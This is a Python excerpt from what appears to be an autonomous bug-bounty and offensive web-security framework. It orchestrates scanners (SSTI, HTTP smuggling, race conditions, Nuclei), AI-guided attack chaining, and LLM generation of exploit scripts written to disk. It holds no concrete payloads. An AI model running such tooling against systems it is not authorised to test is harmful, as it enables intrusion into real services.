            graphql_engine = GraphQLReaper(target=target_url)
            graphql_findings = await graphql_engine.run()
            all_findings.extend(graphql_findings)
        except Exception as e: console.print(f"[dim red]GraphQL Reaper error: {e}[/dim red]")
        
        # 4. SSTI Reaper (SSTIEngine)
        try:
            self.ssti_engine.target = target_url
            ssti_findings = await self.ssti_engine.run({"all_api_calls": [{"url": target_url}]}) # Passing minimal map if needed
            all_findings.extend(ssti_findings)
            for f in ssti_findings:
                self.db.add_finding(recon_domain, f, f["type"], f["severity"], campaign_id)
        except Exception as e: console.print(f"[dim red]SSTI Engine error: {e}[/dim red]")

        # 5. HTTP Smuggling Engine
        try:
            smuggling_findings = await self.smuggling_engine.scan_target(target_url)
            all_findings.extend(smuggling_findings)
            for f in smuggling_findings:
                self.db.add_finding(recon_domain, f, f["type"], f["severity"], campaign_id)
        except Exception as e: console.print(f"[dim red]Smuggling Engine error: {e}[/dim red]")

        # 6. WebSocket & OAuth Engine
        try:
            ws_oauth_findings = await self.ws_oauth_engine.scan_target(target_url)
            all_findings.extend(ws_oauth_findings)
            for f in ws_oauth_findings:
                self.db.add_finding(recon_domain, f, f["type"], f["severity"], campaign_id)
        except Exception as e: console.print(f"[dim red]WS+OAuth Engine error: {e}[/dim red]")

        # Neural-Chain v38.0: Autonomous Logic Synthesis & Execution
        if endpoints_to_fuzz and self.logic_fuzzer:
            status.update(f"[bold red][⛓️] Neural-Chain: Synthesizing autonomous workflow for {len(endpoints_to_fuzz)} endpoints...")
            
            # 1. AI Synthesis
            workflow_json = await asyncio.to_thread(self.brain.synthesize_workflow, endpoints_to_fuzz)
            
            if workflow_json:
                console.print(f"[bold cyan]🧠 [Brain] Workflow synthesized with {len(workflow_json)} steps.[/bold cyan]")
                
                # 2. Execute via centralized LogicFuzzer engine
                status.update(f"[bold red][💥] Neural-Chain: Launching stateful logic fuzzer...")
                findings = await self.logic_fuzzer.run(
                    target=target_url, 
                    workflow_json=workflow_json
                )
                
                for f in findings:
                    all_findings.append(f.model_dump() if hasattr(f, "model_dump") else f)
                    console.print(f"[bold red][[!!!]] Logic Flaw Detected: {f.content}[/bold red]")
            else:
                console.print("[yellow][!] AI failed to synthesize a valid workflow. Skipping autonomous fuzzer.[/yellow]")
                
        return all_findings

    async def _phase_sentient_interception(self, target_url: str, status):
        ZenithUI.phase_banner("Phase 3.8: Sentient Interception", target_url, icon="🌀")
        status.update(f"[bold cyan]Launching Nexus Proxy & OMEGA Crawler for state mapping...")
        
        log_file = "nexus_traffic.json"
        if os.path.exists(log_file): os.remove(log_file)
        
        # 1. Start Veritas Backbone (If not running)
        self.nexus_bridge.start_veritas(port=50051)
        asyncio.create_task(self._resource_guard_monitor())
        
        # 2. Trigger Proxy Worker via Veritas (Omega RPC)
        self.nexus_bridge.start_proxy(port=8081, log_file=log_file)
        await asyncio.sleep(2) # Wait for proxy to bind
        
        # 3. Run OMEGA Crawler
        try:
            await self.omega_crawler.start()
            await self.omega_crawler.crawl(target_url)
            await self.omega_crawler.stop()
        except Exception as e:
            console.print(f"[bold red][!] OMEGA Crawler failed: {e}[/bold red]")
        
        # 3. Read Logs & Model State
        traffic_logs = []
        if os.path.exists(log_file):
            with open(log_file, "r") as f:
                for line in f:
                    try: traffic_logs.append(json.loads(line))
                    except: pass
        
        if not traffic_logs:
            console.print("[yellow][!] No traffic intercepted. Neural modeling skipped.[/yellow]")
            return {}

        status.update(f"[bold magenta]Shadow State Modeler: Reconstructing {len(traffic_logs)} transactions...")
        state_model = await self.shadow_state.model_sequence(traffic_logs)
        
        # 4. Integrate with StatefulLogicFuzzer
        if state_model.get("states"):
            console.print(f"[bold green][[BRAIN]] Neural Model synthesized: {len(state_model['states'])} states found.[/bold green]")
            fuzzer = StatefulLogicFuzzer(base_url=target_url)
            # v2.0: Feed the neural model directly to the fuzzer
            # This is a hypothetical extension to the fuzzer we will implement next
            if hasattr(fuzzer, "ingest_model"):
                await fuzzer.ingest_model(state_model)
                await fuzzer.execute_advanced_strategy()
                
        return state_model

    async def _phase_audit(self, target_url, recon_domain, discovered_urls, status, campaign_id, swarm_mode):
        ZenithUI.phase_banner("Phase 4: Deep Security Audit", target_url, icon="💥")
        await self._broadcast(recon_domain, type="stats", data={"progress": 75})
        await self._broadcast(f"Initiating Deep Security Audit on {recon_domain}...", type="audit", level="warning", icon="bomb")
        
        # Zenith v33: Engaging Heavy Weapons Suite
        from aura.modules.scanners.smuggling_engine import SmugglingEngine
        from aura.modules.scanners.race_engine import RaceEngine
        smuggler = SmugglingEngine()
        racer = RaceEngine()
        
        all_vulns = []
        
        # 1. PowerStack / Nuclei (Broad Scanning)
        status.update("[bold yellow]Running PowerStack & Nuclei broad vulnerability discovery...")
        
        # v33: Run Heavy Weapons concurrently
        status.update("[bold red]Engaging Smuggling & Race Engines (Zenith Suite)...")
        heavy_results = await asyncio.gather(
            smuggler.run(target_url),
            racer.run(target_url, discovered_urls)
        )
        for sub_finding_list in heavy_results:
            all_vulns.extend(sub_finding_list)
            for v in sub_finding_list:
                self.db.add_finding(recon_domain, v, v['type'], v['severity'], campaign_id)
        try:
            power_findings = await self.power_stack.nuclei_scan(target_url)
            all_vulns.extend(power_findings)
        except Exception as e:
            console.print(f"[dim red][!] PowerStack/Nuclei encountered an error: {e}[/dim red]")
            # Fallback to internal nuclei_engine if power_stack fails
            vulns = await self.nuclei_engine.scan(target_url)
            all_vulns.extend(vulns)

        # 2. AuraSingularity (Main Target CoT Attack)
        status.update(f"[bold red]AuraSingularity: Unleashing Autonomous CoT Logic Attack...")
        try:
            async with self.sing_semaphore:
                sing_findings = await self.singularity.execute_singularity(target_url)
                all_vulns.extend(sing_findings)
        except Exception as e:
            console.print(f"[dim red][!] AuraSingularity skipped: {e}[/dim red]")

        # 3. AuraDAST (Multi-target Browser-based Fuzzing)
        unique_urls = list(set([target_url] + discovered_urls))
        audit_limit = 15 # Velocity v38.5: Increased depth
        targets_to_audit = unique_urls[:audit_limit]
        
        status.update(f"[bold red]AuraDAST: Auditing {len(targets_to_audit)} unique endpoints with Nexus Deep...")
        
        async def _run_dast(url):
            async with self.dast_semaphore:
                try:
                    return await self.dast.scan_target(url)
                except Exception as e:
                    console.print(f"[dim red][!] AuraDAST Error on {url}: {e}[/dim red]")
                    return []

        if swarm_mode and self.fleet_manager._enabled:
            status.update(f"[bold magenta]FleetManager: Distributing audit across {len(targets_to_audit)} targets...[/bold magenta]")
            nodes = await self.fleet_manager.provision_nodes(count=3)
            await self.fleet_manager.distribute_workflow("deep-audit", targets_to_audit, nodes)
            swarm_results = await self.fleet_manager.collect_results()
            for res in swarm_results:
                all_vulns.extend(res.get("findings", []))
            await self.fleet_manager.decommission_fleet()
        else:
            dast_results = await asyncio.gather(*[_run_dast(u) for u in targets_to_audit])
            for cluster in dast_results:
                all_vulns.extend(cluster)

        # 4. Apex Sentinel (Autonomous Verification Loop)
        status.update(f"[bold red]ApexSentinel: Verifying {len(all_vulns)} potential vulnerabilities with zero-day logic...")
        verified_vulns = []
        for v in all_vulns:
            # We skip verification for informational findings if needed, but for BB we verify HIGH/CRITICAL
            if v.get("severity") in ["CRITICAL", "HIGH", "MEDIUM"]:
                is_real = await self.apex.verify_finding(v, recon_domain)
                if is_real:
                    v["confirmed"] = True
                    v["verified_by"] = "ApexSentinel"
                    verified_vulns.append(v)
                    
                    # Phase 4.3: Automated Bounty Reporting
                    if v.get("severity") in ["HIGH", "CRITICAL"]:
                        console.print(f"[bold green]| [📝] ApexSentinel verified. Generating professional bounty report...[/bold green]")
                        await self.bounty_reporter.generate_report(v)
                else:
                    logger.info(f"[!] ApexSentinel discarded unverified finding: {v.get('type')}")
            else:
                # Keep low/info findings for context
                verified_vulns.append(v)

        # 5. Save and Deduplicate
        final_vulns = []
        seen_findings = set()
        for v in verified_vulns:
            # v38.0: Findings can be dicts or strings (Nuclei findings are dicts)
            if isinstance(v, dict):
                sig = f"{v.get('type')}_{v.get('content')[:100]}"
                if sig not in seen_findings:
                    seen_findings.add(sig)
                    final_vulns.append(v)
                    self.db.add_finding(recon_domain, v, v.get("type"), v.get("severity", "HIGH"), campaign_id)
            elif isinstance(v, str):
                if v not in seen_findings:
                    seen_findings.add(v)
                    f_dict = {"type": "Manual Finding", "content": v, "severity": "MEDIUM"}
                    final_vulns.append(f_dict)
                    self.db.add_finding(recon_domain, f_dict, "Manual Finding", "MEDIUM", campaign_id)

        console.print(f"[bold green][OK] Deep Security Audit complete: {len(final_vulns)} high-signal vulnerabilities identified.[/bold green]")
        return final_vulns

    async def _phase_exploit(self, recon_domain, vulns, status, campaign_id):
        if self.context.flags.clinic_mode:
            ZenithUI.clinic_info("Phase 5: Exploitation", "This is where we confirm the vulnerabilities. Aura creates safe 'Proof of Concepts' to prove the flaw exists without damaging the server.")
        ZenithUI.phase_banner("Phase 5: Autonomous Exploitation", recon_domain, icon="exploit")
        status.update(f"[bold purple]Synthesizing custom exploit chains...")
        await self.execute_exploit_chaining(recon_domain, vulns)
        # Elite Logic: Autonomous PoC Generation for CRITICAL/HIGH Findings
        if vulns:
            high_value_vulns = [v for v in vulns if v.get("severity") in ["CRITICAL", "HIGH"]]
            if high_value_vulns:
                exploit_dir = os.path.join(os.getcwd(), "aura_exploits")
                if not os.path.exists(exploit_dir): os.makedirs(exploit_dir)
                weapon_sem = asyncio.Semaphore(5)
                async def _weaponize(i, v):
                    async with weapon_sem:
                        script = await asyncio.to_thread(self.brain.generate_exploit_script, v.get("type"), v.get("content"), recon_domain)
                        filepath = os.path.join(exploit_dir, f"proof_of_concept_{recon_domain.replace('.', '_')}_{i}.py")
                        with open(filepath, "w", encoding="utf-8") as f: f.write(script)
                await asyncio.gather(*[_weaponize(i, v) for i, v in enumerate(high_value_vulns)])
        return vulns

    async def _phase_finalize(self, recon_domain, vulns, tech_stack, status, campaign_id):
        ZenithUI.phase_banner("Phase 6: Mission Finalization", recon_domain, icon="finish")
        await self._broadcast(recon_domain, type="stats", data={"progress": 100})
        status.update(f"[bold green]Generating strategic reports and submitting bugs...")
        stack_name = tech_stack[0].split("/")[0] if (isinstance(tech_stack, list) and tech_stack) else "Generic"
        report_paths = await self.reporter.finalize_mission(recon_domain, vulns, tech_stack=stack_name)
        
        if report_paths:
            console.print(f"\n[bold green][OK] Reports generated successfully:[/bold green]")
            for path in report_paths:
                console.print(f"  [cyan]↳ {path}[/cyan]")
        else:
            console.print(f"\n[bold yellow][!] No confirmed high-severity findings for reporting.[/bold yellow]")
            
        self.db.save_target({"target": recon_domain, "status": "COMPLETED"})
        return report_paths

    async def execute_advanced_chain(self, domain, campaign_id=None, swarm_mode=False):
        await self._broadcast(f"Mission Initiated: Target {domain}", type="system", level="success", icon="start")
        self.effective_fast_mode = self.context.flags.fast_mode
        self.current_campaign = campaign_id
        domain = self.db.normalize_target(domain)
        if not self.scope.is_in_scope(domain): return {"status": "blocked"}
        watchdog_task = asyncio.create_task(self._memory_watchdog())
        db_worker_task = asyncio.create_task(self.db._db_worker()) if hasattr(self.db, '_db_worker') else None
        try:
            with ZenithUI.status(f"Engaging Sentient Singularity for {domain}...") as status:
                await self.activate_sentient_mode(domain)
                _t0 = time.time()
                domain, target_url, recon_domain, is_live = await self._phase_preflight(domain, status)
                METRICS.phase_duration.labels(phase_name="preflight").observe(time.time() - _t0)
                if not is_live: return {"status": "ERROR"}
                _t1 = time.time()
                import socket
                try: target_ip = await asyncio.to_thread(socket.gethostbyname, recon_domain)
                except: target_ip = None
                intel_data = await self._phase_intel(recon_domain, target_ip, status, campaign_id)
                METRICS.phase_duration.labels(phase_name="intel").observe(time.time() - _t1)
                _t2 = time.time()
                recon_data = await self.recon_pipeline.run(
                    recon_domain, 
                    target_ip, 
                    intel_data=intel_data, 
                    stealth_mode=self.effective_fast_mode,
                    beginner_mode=self.context.flags.beginner_mode
                )
                METRICS.phase_duration.labels(phase_name="recon").observe(time.time() - _t2)
                _t3 = time.time()
                discovered_urls, discovered_forms = await self._phase_discovery(target_url, recon_domain, recon_data, status, campaign_id)
                METRICS.phase_duration.labels(phase_name="discovery").observe(time.time() - _t3)
                
                # v40.0: 0-Day Radar
                await self._broadcast(f"Scanning for 0-Day exploits in {recon_domain}...", type="intel", icon="radar")
                await self._phase_0day_radar(recon_domain, recon_data.get("tech_stack", []), campaign_id)
                
                _t3_5 = time.time()
                deconstruction_findings = await self._phase_deconstruction(target_url, recon_domain, recon_data, status, campaign_id)
                METRICS.phase_duration.labels(phase_name="deconstruction").observe(time.time() - _t3_5)
                
                _t3_8 = time.time()
                await self._phase_sentient_interception(target_url, status)
                METRICS.phase_duration.labels(phase_name="sentient_interception").observe(time.time() - _t3_8)
                
                _t4 = time.time()
                vulns = await self._phase_audit(target_url, recon_domain, discovered_urls, status, campaign_id, swarm_mode)
                METRICS.phase_duration.labels(phase_name="audit").observe(time.time() - _t4)
                _t5 = time.time()
                vulns = await self._phase_exploit(recon_domain, vulns + deconstruction_findings, status, campaign_id)
                METRICS.phase_duration.labels(phase_name="exploit").observe(time.time() - _t5)
                _t6 = time.time()
                report_paths = await self._phase_finalize(recon_domain, vulns, recon_data.get("tech_stack"), status, campaign_id)
                METRICS.phase_duration.labels(phase_name="finalize").observe(time.time() - _t6)
                return {"status": "COMPLETE", "findings": len(vulns)}
        except Exception as e:
            console.print(f"[bold red][ERR] FATAL MISSION ERROR: {e}[/bold red]")
            return {"status": "ERROR"}
        finally:
            self._guard_active = False
            watchdog_task.cancel()
            if db_worker_task: db_worker_task.cancel()
            self.nexus_bridge.stop_veritas()
            await self.close()

    async def execute_exploit_chaining(self, domain: str, findings: list):
        if not findings or len(findings) < 2: return
        
        console.print(f"[bold yellow][ORACLE] Analyzing high-impact exploit chains for {domain}...[/bold yellow]")
        
        prompt = f"""
        Analyze these findings for {domain} and determine if they can be chained for a CRITICAL bug bounty impact.
        Findings: {json.dumps(findings[:20])}
        
        Focus on:
        - Information Disclosure -> Account Takeover
        - SSRF -> Internal Service Exploitation
        - IDOR -> PII Leakage / Data Destruction
        - CRSF -> Sensitive Action Execution
        
        Return a JSON list of objects: {{"chain_name": "...", "logic": "...", "severity": "CRITICAL", "payout_estimate": "$$$$"}}
        Return an empty list if no critical chain is possible.
        """
        try:
            # We use the brain to reason about the 'Business Logic' of the chain
            raw = await asyncio.to_thread(self.brain.reason_json, prompt)
            chains = json.loads(raw) if isinstance(raw, list) else json.loads(raw).get("chains", [])
            for chain in chains:
                console.print(f"[bold red][CHAIN] Detected: {chain.get('chain_name')} (Est. Payout: {chain.get('payout_estimate')})[/bold red]")
                findings.append({
                    "type": f"Exploit Chain: {chain.get('chain_name')}", 
                    "severity": "CRITICAL",
                    "content": chain.get("logic"),
                    "points": 100
                })
        except Exception as e:
            logger.debug(f"ROI Chaining failed: {e}")

    async def execute_hunt(self):
        """v40.0 OMEGA: Entry point for the Eternal Hunt."""
        console.print("[bold red][HUNT] ENTERING ETERNAL HUNT MODE: Payout Optimization Tier 1 [/bold red]")
        await self.mission_hunter.run_eternal_hunt(self)

    async def _oast_polling_loop(self, recon_domain: str):
        while True:
            try: await self.oast.poll(db_callback=self.db.save_finding)
            except Exception: pass
            await asyncio.sleep(30)

    async def smart_route_finding(self, finding: Dict[str, Any]):
        """
        Analyzes a finding and triggers subsequent engines based on the finding type.
        This enables autonomous escalation (e.g., Subdomain -> ThreatIntel).
        """
        finding_type = finding.get("type", "").lower()
        registry = get_registry()
        
        # Resolve which engines to run next
        target_engines = registry.resolve_routing(finding_type)
        
        if not target_engines:
            return
            
        console.print(f"[bold cyan][ROUTE] Triggering {len(target_engines)} downstream engines for: {finding_type}...[/bold cyan]")
        
        # Prepare dependencies for the engines
        kwargs = {
            "persistence": self.persistence,
            "telemetry": self.telemetry,
            "brain": self.brain
        }
        
        # Run them in parallel (Async Execution)
        task = asyncio.create_task(registry.run_parallel(target_engines, self.context, **kwargs))
        self._active_tasks.add(task)
        task.add_done_callback(self._active_tasks.discard)
